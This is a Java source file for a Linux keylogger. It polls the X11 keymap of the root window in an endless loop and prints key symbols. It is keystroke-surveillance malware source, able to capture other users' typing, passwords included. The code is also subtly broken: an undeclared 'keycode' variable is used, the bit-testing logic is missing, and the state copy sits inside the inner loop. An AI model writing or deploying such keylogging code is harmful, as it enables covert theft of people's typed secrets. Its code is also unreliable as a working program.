package co.uk.baconi.activity;

import java.util.Arrays;

import co.uk.baconi.x11.MX11;
import co.uk.baconi.x11.MX11.Display;
import co.uk.baconi.x11.MX11.Window;
import co.uk.baconi.x11.MX11.XEvent;

public final class LinuxKeyLogger {

    private static final MX11 mx11 = MX11.INSTANCE;

    public static void main(final String[] args) {
        System.out.println("START");

        final LinuxKeyLogger linuxKeyLogger = new LinuxKeyLogger();
        linuxKeyLogger.run();

        System.out.println("END");
    }

    private final Display x11Display;
    private final Window x11Window;
    private final XEvent x11Event;

    public LinuxKeyLogger() {
        x11Display = mx11.XOpenDisplay(null);
        x11Window = mx11.XDefaultRootWindow(x11Display);
        x11Event = new XEvent();
    }

    private void run() {
        final byte szKey[] = new byte[32];
        final byte szKeyOld[] = new byte[32];

        byte szBit;
        byte szBitOld;
        int iCheck;

        for (;;) {
            mx11.XQueryKeymap(x11Display, szKey);
            if (isNotEmpty(szKey) && !Arrays.equals(szKey, szKeyOld)) {
                for (int i = 0; i < szKey.length; i++) {
                    szBit = szKey[i];
                    szBitOld = szKeyOld[i];
                    iCheck = 1;
                    for (int j = 0; j < 8; j++) {
                        System.out.println(mx11.XKeycodeToKeysym(x11Display, keycode, 0).doubleValue());
                        System.arraycopy(szKey, 0, szKeyOld, 0, szKey.length);

                        iCheck++;
                    }
                }
            }
        }
    }

    private boolean isNotEmpty(final byte[] byteArray) {
        for (final byte value : byteArray) {
            if (value != 0) {
                return true;
            }
        }
        return false;
    }
}